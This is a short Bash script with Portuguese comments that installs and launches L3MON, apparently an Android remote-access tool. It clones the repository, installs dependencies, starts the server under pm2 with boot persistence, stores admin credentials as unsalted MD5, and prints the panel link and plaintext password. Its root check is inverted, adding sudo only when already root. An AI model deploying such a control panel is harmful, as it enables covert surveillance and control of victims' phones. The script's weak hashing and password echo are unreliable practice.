#!/bin/bash

# Verifica se o usuário é root ou não (ou seja, se está sendo executado com privilégios de administrador).
if [ "$(id -u)" -eq 0 ]; then
    # O usuário é root, definimos algumas variáveis para os comandos
    INSTALL_CMD="sudo apt install"
    NODE_CMD="sudo npm"
    PM2_CMD="sudo pm2"
else
    # O usuário não é root, definimos algumas variáveis para os comandos
    INSTALL_CMD="apt install"
    NODE_CMD="npm"
    PM2_CMD="pm2"
fi

# Verifica se o diretório do repositório já existe; se não, clona o repositório
if [ ! -d "L3MON" ]; then
    git clone https://github.com/efxtv/L3MON.git
fi

# Move o script para dentro do diretório do repositório L3MON (exceto o próprio diretório do script)
script_dir=$(dirname "$(readlink -f "$0")")
l3mon_dir="L3MON/$(basename "$script_dir")"
if [ "$script_dir" != "$l3mon_dir" ]; then
    mv "$script_dir" "$l3mon_dir"
fi

# Acessa o diretório do repositório clonado
cd "L3MON"

# Instala as dependências
$INSTALL_CMD wget curl git npm nano nodejs openjdk-8-jdk openjdk-8-jre

# Instala dependências adicionais e inicia o aplicativo
$NODE_CMD install
$NODE_CMD audit fix
$NODE_CMD audit
$NODE_CMD install
$PM2_CMD start index.js
$PM2_CMD startup

# Obtém o nome de usuário do usuário
read -p "Digite o nome de usuário (username): " username

# Obtém a senha do usuário para gerar a hash MD5
read -s -p "Digite a senha: " senha
md5hash=$(echo -n "$senha" | openssl md5 | awk '{print $2}')

# Cria o arquivo maindb.json
cat > maindb.json <<EOF
{
  "admin": {
    "username": "$username",
    "password": "$md5hash",
    "loginToken": "",
    "logs": [],
    "ipLog": []
  },
  "clients": []
}
EOF

# Obtém o IP do sistema
ip=$(hostname -I | awk '{print $1}')

# Gera o link
link="http://$ip:22533"

echo "Link gerado: $link"
echo "Credenciais: User:$username Pass:$senha"
